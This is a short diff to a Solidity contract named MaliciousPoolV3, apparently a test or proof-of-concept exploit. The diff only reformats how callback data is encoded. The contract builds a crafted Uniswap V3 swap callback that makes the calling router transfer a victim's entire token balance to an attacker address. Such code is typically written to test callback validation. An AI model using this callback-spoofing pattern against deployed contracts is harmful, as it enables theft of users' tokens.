@@ -37,7 +37,13 @@ contract MaliciousPoolV3 {
         bytes memory transferCall = CalldataLib.encodeTransferIn(tokenToSteal, attacker, victimBalance);
 
         bytes memory callbackData = abi.encodePacked(
-            victim, tokenToSteal, address(0), uint8(DexTypeMappings.UNISWAP_V3_ID), uint16(500), uint16(transferCall.length), transferCall
+            victim,
+            tokenToSteal,
+            address(0),
+            uint8(DexTypeMappings.UNISWAP_V3_ID),
+            uint16(500),
+            uint16(transferCall.length),
+            transferCall
         );
 
         (bool success,) = msg.sender.call(abi.encodeWithSelector(bytes4(SELECTOR_UNIV3), int256(1), int256(0), callbackData));
